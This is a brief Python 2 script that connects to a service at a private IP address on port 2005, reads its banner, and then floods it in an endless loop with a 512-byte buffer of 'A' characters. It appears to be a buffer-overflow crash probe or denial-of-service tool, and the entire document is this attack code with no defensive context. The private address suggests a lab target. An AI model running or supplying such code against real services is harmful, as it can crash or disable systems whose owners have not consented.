if __name__ == '__main__':
	import socket
	buffer = 'A'*0x200
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect(('192.168.198.136',0x7d5))

	print sock.recv(1024)
	while True:
		sock.send(buffer)
		
		